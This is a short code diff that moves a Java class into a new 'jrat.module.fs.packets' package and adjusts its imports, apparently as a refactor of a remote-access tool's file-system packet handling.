@@ -1,7 +1,7 @@
-package jrat.client.packets.incoming;
+package jrat.module.fs.packets;
 
 import jrat.client.Connection;
-import jrat.client.packets.outgoing.Packet22ListFiles;
+import jrat.client.packets.incoming.AbstractIncomingPacket;
 import java.io.File;
 
 
